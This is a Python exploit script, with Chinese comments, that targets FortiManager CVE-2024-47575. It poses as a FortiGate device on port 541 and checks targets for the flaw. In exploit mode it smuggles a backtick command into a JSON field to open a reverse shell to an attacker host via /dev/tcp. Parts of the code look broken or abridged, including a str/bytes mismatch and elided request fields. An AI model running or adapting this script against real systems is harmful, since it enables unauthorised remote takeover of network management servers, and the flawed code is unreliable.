import socket
import struct
import ssl
import argparse
import random
from time import sleep

# 欢迎信息
BANNER = """欢迎使用 FortiManager CVE-2024-47575 漏洞利用工具"""

# 显示欢迎信息
def display_banner():
    print(BANNER)

# 初始化参数解析器
def init_arg_parser():
    parser = argparse.ArgumentParser(description='FortiManager CVE-2024-47575 漏洞利用工具')
    parser.add_argument('--target', type=str, help='目标IP地址', required=True)
    parser.add_argument('--lhost', type=str, help='攻击者IP地址', required=False, default='empty')
    parser.add_argument('--lport', type=str, help='攻击者端口号', required=False, default='empty')
    parser.add_argument('--action', type=str, choices=['check', 'exploit'], help='操作模式：检测 "check" 或利用 "exploit"', required=True)
    return parser

# 创建SSL套接字
def create_ssl_sock(host):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_cert_chain(certfile="w00t_cert.bin", keyfile="w00t_key.bin")  # 加载证书和密钥
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    s = socket.create_connection(host, timeout=30)
    ssl_sock = context.wrap_socket(s)
    return ssl_sock

# 发送请求并接收响应
def send_request(sock, request, recv=True):
    message = struct.pack(">II", 0x36e01100, len(request) + 8) + request
    sock.send(message)
    if not recv:
        return
    hdr = sock.read(8)
    if len(hdr) != 8:
        return hdr
    _, size = struct.unpack(">II", hdr)
    return sock.read(size)

# 打印消息并暂停
def print_and_sleep(msg, delay=0.4):
    print(msg)
    sleep(delay)

# 构建请求数据
def build_requests(lhost, lport):
    request_getip = b"""get ip
serialno=FGVMEVWG8YMT3R63
mgmtid=00000000-0000-0000-0000-000000000000
platform=FortiGate-VM64
...\0""".replace(b"\n", b"\r\n")

    request_auth = b"""get auth
serialno=FGVMEVWG8YMT3R63
mgmtid=00000000-0000-0000-0000-000000000000
...\0""".replace(b"\n", b"\r\n")

    request_file_exchange = b"""get file_exchange
localid=REPLACE_LOCAL_ID
chan_window_sz=32768
deflate=gzip
file_exch_cmd=put_json_cmd

\0""".replace(b"\n", b"\r\n").replace(b"REPLACE_LOCAL_ID", str(random.randint(100, 999)).encode())

    json_payload = b"""{
    "method": "exec",
    "id": 1,
    "params": [
        {
            "url": "um/som/export",
            "data": {
               "file":"`sh -i >& /dev/tcp/REPLACE_LHOST/REPLACE_LPORT 0>&1`"
            }
        }
    ]
}""".replace(b"REPLACE_LHOST", lhost.encode()).replace(b"REPLACE_LPORT", lport.encode())

    return request_getip, request_auth, request_file_exchange, json_payload

# 主函数
def main():
    display_banner()
    parser = init_arg_parser()
    args = parser.parse_args()

    # 参数校验
    if args.action == "exploit" and (args.lhost == 'empty' or args.lport == 'empty'):
        print("[错误] 选择 'exploit' 模式时必须提供 '--lhost' 和 '--lport'")
        exit(1)

    host = (args.target, 541)
    ssl_sock = create_ssl_sock(host)

    # 构建请求
    request_getip, request_auth, request_file_exchange, json_payload = build_requests(args.lhost, args.lport)

    # 发送获取IP请求
    print_and_sleep("[步骤1] 发送获取IP请求...")
    response = send_request(ssl_sock, request_getip)
    print(response.decode(errors='ignore'))

    # 发送认证请求
    print_and_sleep("[步骤2] 发送认证请求...")
    response = send_request(ssl_sock, request_auth)
    print(response.decode(errors='ignore'))

    # 检查漏洞
    print_and_sleep("[步骤3] 检查漏洞...")
    response = send_request(ssl_sock, request_file_exchange)
    remote_id = response.decode(errors='ignore').split('\r\n')[1].split('=')[1].strip()

    if remote_id:
        print(f"[漏洞] 目标存在漏洞，Remote ID: {remote_id}")
    else:
        print("[安全] 目标无漏洞")
        exit(1)

    if args.action == "check":
        exit(1)

    # 利用漏洞
    print_and_sleep("[步骤4] 开始利用漏洞...")
    request_channel_open = f"""channel
remoteid={remote_id}
\0""".replace(b"\n", b"\r\n") + json_payload
    send_request(ssl_sock, request_channel_open.encode(), recv=False)

    print("[完成] 漏洞利用完成")

if __name__ == "__main__":
    main()
